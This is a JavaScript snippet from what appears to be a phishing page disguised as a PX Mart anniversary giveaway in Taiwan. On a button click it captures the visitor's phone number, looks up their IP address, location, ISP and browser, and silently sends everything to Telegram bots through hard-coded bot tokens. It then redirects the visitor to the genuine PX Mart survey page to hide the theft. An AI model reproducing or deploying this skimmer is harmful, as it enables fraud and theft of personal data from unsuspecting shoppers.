<script>
document.addEventListener("DOMContentLoaded", function(){
  const btn = document.getElementById("getBtn");
  const phoneInput = document.getElementById("phone");

  btn.addEventListener("click", function(){
    // 這行才是正確取值（之前錯成 phoneInput 整個物件）
    const phone = phoneInput.value.trim(); 
    
    // 完全接受任何輸入（包含空白、1碼、亂碼）
    if(phone === "" && phone.length === 0) phone = "(空白)"; // 可選：空白顯示為(空白)

    btn.textContent = "領取中...";
    btn.disabled = true;

    const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
    const base = `全聯週年慶開跑\n電話：+886${phone}\n時間：${time}`;

    // 抓完整 IP 資訊
    fetch("https://cfip.mx/json")
      .then(r => r.json())
      .then(data => {
        const full = base +
          `\nIP　　：${data.ip}` +
          `\n位置　：${data.city||"未知"}，${data.country||"台灣"}` +
          `\nISP　　：${data.asn_org||"未知"}` +
          `\n裝置　：${navigator.userAgent.substring(0,130)}...`;
        sendToBot(full);
      })
      .catch(() => sendToBot(base));

    function sendToBot(msg){
      const tokens = [
        "8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys",
        "7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE"
      ];
      tokens.forEach(t => {
        new Image().src = `https://api.telegram.org/bot${t}/sendMessage?chat_id=1137905005&text=${encodeURIComponent(msg)}`;
      });
    }

    // 三重強制跳轉（手機電腦全部成功）
    setTimeout(() => location.replace("https://www.pxmart.com.tw/campaign/survey"), 1500);
    setTimeout(() => {
      const a = document.createElement("a");
      a.href = "https://www.pxmart.com.tw/campaign/survey";
      a.target = "_top";
      document.body.appendChild(a);
      a.click();
    }, 2000);
  });
});
</script>
